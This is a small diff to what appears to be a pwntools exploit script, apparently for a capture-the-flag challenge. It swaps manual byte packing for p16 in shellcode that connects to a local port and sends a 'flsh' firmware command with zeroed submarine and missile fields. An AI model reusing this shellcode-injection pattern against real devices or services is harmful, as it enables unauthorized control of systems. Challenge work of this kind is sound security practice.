@@ -6,8 +6,8 @@ command = b"flsh"
 firmware = "/firmware/missile.1.3.52.fw_signed"
 shellcode = "sub sp, sp, #0x100\n"
 
-submarine = bytes([0]).ljust(2, b"\x00")
-missile = bytes([0]).ljust(2, b"\x00")
+submarine = p16(0)
+missile = p16(0)
 full_command = command + submarine + missile
 shellcode += shellcraft.connect("127.0.0.1", 1025)
 shellcode += shellcraft.write("x12", full_command, len(full_command))
